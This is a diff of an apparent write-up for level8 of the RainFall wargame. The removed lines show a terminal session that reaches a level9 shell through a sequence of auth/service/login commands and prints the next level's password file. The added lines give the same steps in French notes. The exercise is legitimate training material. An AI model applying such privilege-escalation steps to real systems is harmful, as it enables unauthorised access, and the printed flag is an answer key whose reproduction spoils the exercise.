@@ -1,35 +1,24 @@
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-(nil), (nil)
-service
-(nil), 0x804a008
-login
-Segmentation fault (core dumped)
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-(nil), (nil)
-login
-Segmentation fault (core dumped)
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-0x804a008, (nil)
-login
-Password:
-0x804a008, (nil)
-service
-0x804a008, 0x804a018
+Ici nous avons un programme qui demande un login et un mot de passe 
 
-0x804a008, 0x804a018
-service
-0x804a008, 0x804a028
-login
-$ id
-uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
-$ pwd
-/home/user/level8
-$ cat /home/user/level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-$
+Avec gdb en analisant le code source sous sa forme assembleur, on vois une
+serie de :
+
+repz cmps (compare les strings)
+
+Avec ces 4 strings
+
+EAX: 0x8048819 ("auth ")
+EAX: 0x804881f ("reset")
+EAX: 0x8048825 ("service")
+EAX: 0x804882d ("login")
+
+le tout dans une boucle infinie.
+
+Il s'agit de comparer des strings pour rentrer dans les if
+
+1) On s'authentifie avec la commande auth (ne pas oublier l'espace)
+2) ensuite on entre le login "service"
+3) Si on entre la commande login on nous demande le mot de passe.
+4) On entre la commande service en mot de passe.
+5) On tape la commande login pour demander de ce loguer.
+6) nous avons notre shell.
